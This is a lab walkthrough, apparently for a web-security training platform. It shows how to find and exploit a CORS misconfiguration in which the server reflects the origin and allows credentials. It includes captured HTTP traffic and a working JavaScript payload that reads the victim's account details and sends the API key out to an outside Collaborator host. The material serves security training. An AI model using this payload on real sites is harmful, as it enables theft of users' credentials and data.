# Lab: CORS vulnerability with basic origin reflection


### Step 1: Log in and observe normal behaviour

Log in with wiener:peter. Capture the request to /accountDetails.

```burp
GET /accountDetails HTTP/2
Host: 0a920072043b2f06800cd6c900df0072.web-security-academy.net
Cookie: session=FTsYEKm2zZ9t0uAiyXaPTeeEQe88mxum
User-Agent: Mozilla/5.0 ...
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a920072043b2f06800cd6c900df0072.web-security-academy.net/my-account?id=wiener
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
```

Response :

```burp
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "bqHYfkL3I5eFlXlPcFVw6WciQ1BZjyLI",
  "sessions": ["FTsYEKm2zZ9t0uAiyXaPTeeEQe88mxum"]
}
```

Here, Access-Control-Allow-Credentials is set to true. So the browser will include cookies and authentication headers in the cross-origin request, making the victim’s session vulnerable to data exfiltration.

### Step 2: Test for CORS misconfiguration

Add an arbitrary Origin header, e.g., Origin: google.com.

Modified request:

```burp
GET /accountDetails HTTP/2
Host: 0a920072043b2f06800cd6c900df0072.web-security-academy.net
Cookie: session=FTsYEKm2zZ9t0uAiyXaPTeeEQe88mxum
Origin: google.com
... (other headers same)
```

Vulnerable response (origin reflected):

```burp
HTTP/2 200 OK
Access-Control-Allow-Origin: google.com
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "apikey": "bqHYfkL3I5eFlXlPcFVw6WciQ1BZjyLI",
  ...
}
```

The server echoes any Origin and allows credentials → vulnerable.

### Step 3: Prepare exploit with Burp Collaborator

Open Burp Collaborator client (Burp menu → Burp Collaborator client). Click “Copy to clipboard” to get a unique URL, e.g., `https://mj95mdkxlvxoea49mqm5lfhc53buzqnf.oastify.com`.

Craft the exploit. It will send an authenticated XMLHttpRequest to /accountDetails from the victim’s browser and forward the API key to the Collaborator URL.

```js
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        if (req.status == 200) {
            var data = JSON.parse(req.responseText);
            var apikey = data.apikey;
            new Image().src = 'https://mj95mdkxlvxoea49mqm5lfhc53buzqnf.oastify.com/?apikey=' + encodeURIComponent(apikey);
        }
    };
    req.open('GET', 'https://0a920072043b2f06800cd6c900df0072.web-security-academy.net/accountDetails', true);
    req.withCredentials = true;
    req.send();
</script>
</body>
</html>
```

### Step 4: Host and deliver the exploit

In the lab, click “Go to exploit server”. Paste the HTML into the “Body” section. Click “Store”. Then click “Deliver exploit to victim”. The victim (administrator) will load the exploit page and execute the malicious script.

### Step 5: Capture the stolen API key

Poll the Burp Collaborator client (“Poll now”). You will see DNS interactions and an HTTP interaction. The HTTP request contains the exfiltrated API key.
Captured HTTP request in Collaborator:

```
GET /?apikey=KB3DvjRErYpawXJe96ADCGnbu5Og4hlw HTTP/1.1
Host: mj95mdkxlvxoea49mqm5lfhc53buzqnf.oastify.com
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 ...
sec-ch-ua-platform: "Linux"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://exploit-...exploit-server.net/
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
```

The parameter apikey holds the administrator’s API key: KB3DvjRErYpawXJe96ADCGnbu5Og4hlw. Submit the solution.

